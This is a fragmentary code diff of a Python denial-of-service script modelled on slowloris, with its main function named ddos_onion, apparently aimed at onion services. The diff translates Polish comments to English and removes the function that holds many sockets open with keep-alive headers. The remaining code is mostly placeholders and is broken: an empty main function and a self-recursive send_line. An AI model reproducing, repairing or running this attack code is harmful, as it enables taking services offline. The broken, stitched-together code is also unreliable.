@@ -3,10 +3,10 @@ import ssl
 import random
 import logging
 
-# ... (inne importy)
+# ... (other imports)
 
 DEFAULT_USER_AGENTS = [
-    # ... (inne user-agents)
+    # ... (other user-agents)
 ]
 
 DEFAULT_SOCK_TIMEOUT = 4
@@ -14,14 +14,14 @@ DEFAULT_SOCK_TIMEOUT = 4
 def generate_fake_identity():
     return "Anonymous"
 
-# ... (inne funkcje)
+# ... (other functions)
 
 def send_line(self, line, identity):
     line = f"{line}\r\n"
     self.send(line.encode("utf-8"))
     self.send_line(f"X-Identity: {identity}")
 
-# ... (inne funkcje)
+# ... (other functions)
 
 def init_socket(ip: str, args, identity):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -45,45 +45,11 @@ def init_socket(ip: str, args, identity):
     s.send_header("Accept-language", "en-US,en,q=0.5")
     return s
 
-# ... (inne funkcje)
-
-def slowloris_iteration(list_of_sockets, args):
-    logging.info("Sending keep-alive headers...")
-    logging.info("Socket count: %s", len(list_of_sockets))
-
-    identity = generate_fake_identity()
-
-    # Try to send a header line to each socket
-    for s in list(list_of_sockets):
-        try:
-            s.send_header("X-a", random.randint(1, 5000))
-        except socket.error:
-            list_of_sockets.remove(s)
-
-    # Some of the sockets may have been closed due to errors or timeouts.
-    # Re-create new sockets to replace them until we reach the desired number.
-
-    diff = args.sockets - len(list_of_sockets)
-    if diff <= 0:
-        return
-
-    logging.info("Creating %s new sockets...", diff)
-    for _ in range(diff):
-        try:
-            s = init_socket(args.host, args, identity)
-            if not s:
-                continue
-            list_of_sockets.append(s)
-        except socket.error as e:
-            logging.debug("Failed to create new socket: %s", e)
-            break
-
-# ... (inne funkcje)
+# ... (other functions)
 
 def ddos_onion():
-    # Główna funkcja programu
-    # Tutaj umieść resztę kodu, który jest obecnie w funkcji `main()`
+    # Main function of the program
+    # Place the rest of your code here
 
 if __name__ == "__main__":
     ddos_onion()
-
